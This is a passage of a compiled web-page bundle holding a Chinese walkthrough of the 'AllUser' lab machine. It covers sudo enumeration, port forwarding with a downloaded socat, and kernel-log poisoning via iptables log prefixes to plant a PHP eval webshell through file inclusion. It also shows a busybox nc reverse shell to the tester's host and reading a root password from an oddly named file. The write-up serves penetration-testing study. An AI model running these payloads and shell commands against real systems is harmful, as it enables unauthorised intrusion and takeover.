权限")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sandu@AllUser:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" sandu on AllUser:\n    env_reset, mail_badpass, "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/bin\n\nUser sandu may run the following commands on AllUser:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: /usr/sbin/iptables\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("可以无密码执行 iptables 命令，无法直接提权")]),s._v(" "),a("h2",{attrs:{id:"内网服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#内网服务探测"}},[s._v("#")]),s._v(" 内网服务探测")]),s._v(" "),a("p",[s._v("查看本地端口服务，发现 80 端口有 web 服务，不对外开放，socat 转发到外网看看")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sandu@AllUser:~$ busybox "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://192.168.6.101/socat\nsandu@AllUser:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" +x socat\nsandu@AllUser:~$ ./socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/6.png",alt:""}})]),s._v(" "),a("p",[s._v("访问 http://192.168.6.183:8080，发现url 有"),a("code",[s._v("?file")]),s._v("参数，可能是文件读取或文件包含")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/7.png",alt:""}})]),s._v(" "),a("p",[s._v("尝试路径穿越任意文件读取无果")]),s._v(" "),a("p",[s._v("如果存在文件包含且这个内核日志可控的话，就可以 getshell")]),s._v(" "),a("h2",{attrs:{id:"getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#getshell"}},[s._v("#")]),s._v(" getshell")]),s._v(" "),a("p",[s._v("sandu 用户有 iptables 提权权限，测试 iptables 能否控制内核日志，添加一条规则，将所有输入包日志前添加 TEST 前缀，验证 kern.log 是否是可控的")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" iptables "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" INPUT "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-j")]),s._v(" LOG --log-prefix "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'TEST'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("日志出现 TEST 前缀，说明内核日志是可控的")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/8.png",alt:""}})]),s._v(" "),a("p",[s._v("通过控制内核日志，测试是否存在文件包含漏洞，注意不要太长，会被截断导致webshell 失败，无法再次利用，可以提前打个快照")]),s._v(" "),a("ul",[a("li",[s._v("syslog 写日志时有行长度/缓冲截断；")]),s._v(" "),a("li",[s._v("LFI 包含时，PHP 解释器只能解析到完整的 <?php ... ?> 片段，出现截掉后面"),a("code",[s._v("?>")]),s._v(" 的情况会导致语法错误，无法执行。")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" iptables "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-A")]),s._v(" INPUT "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-j")]),s._v(" LOG --log-prefix "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php eval($_GET[1]);?>'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("验证存在文件包含漏洞，成功执行 php 代码，服务可能会卡死，建议直接反弹shell")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/9.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("busybox "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nc")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".6.101 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" /bin/bash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("简单交互shell优化")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/usr/bin/script  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-qc")]),s._v(" /bin/bash /dev/null\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 按下 Ctrl+Z")]),s._v("\nstty raw -echo"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fg")]),s._v("\nreset xterm\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("TERM")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("xterm\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("export")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("SHELL")])]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/bin/bash\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"特殊文件名读取"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#特殊文件名读取"}},[s._v("#")]),s._v(" 特殊文件名读取")]),s._v(" "),a("p",[s._v("反弹 shell 成功，拿到 www-data 权限")]),s._v(" "),a("p",[s._v("当前 sudo 仅允许无密码执行 /usr/bin/cmatrix，该程序本身无明显提权利用点，所以继续寻找其它突破口。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data@AllUser:/var/www/html$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v("\nMatching Defaults entries "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" www-data on AllUser:\n    env_reset, mail_badpass,\n    "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("secure_path")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/local/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/local/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/usr/bin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/sbin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v(":/bin\n\nUser www-data may run the following commands on AllUser:\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ALL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" NOPASSWD: /usr/bin/cmatrix\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/10.png",alt:""}})]),s._v(" "),a("p",[s._v("一个黑客视觉的字符流终端效果")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-alluser/11.png",alt:""}})]),s._v(" "),a("p",[s._v("当前目录下可以读取到 root 用户密码，由于文件名以 -- 开头，直接 cat '--help root password' 会被解析成参数。可以通过 ./'--help root password' 或 cat -- '--help root password' 来规避选项解析。")]),s._v(" "),a("p",[s._v("当命令参数以路径形式出现时，不会被解析为选项，因为./明确指定了这是一个文件路径，而不是命令行选项")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("www-data@AllUser:/var/www/html$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-alh")]),s._v("\ntotal 28M\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root     root       "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("21")]),s._v(" Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 08:45 "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'--help root password'")]),s._v("\ndrwx------ "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" www-data www-data "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("17")]),s._v(":21  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\ndrwxr-xr-x "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" root     root     "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v(".0K Apr  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2025")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\n-rw-r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" www-data www-data "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".7K Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" 09:06  index.php\n-r--r--r-- "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" root     root      28M Nov "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v(" 07:40  kern.log\nwww-data@AllUser:/var/www/html$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" ./"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'--help root password'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" ./"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'--help root password'")]),s._v("\nGLgxSXMQJXMgKvqVM41r\nwww-data@AllUser:/var/www/html$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" root\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" root\nPassword: GLgxSXMQJXMgKvqVM41r\n\nroot@AllUser:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nroot@AllUser:/var/www/html"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br")])])])}),[],!1,null,null,null);a.default=e.exports}}]);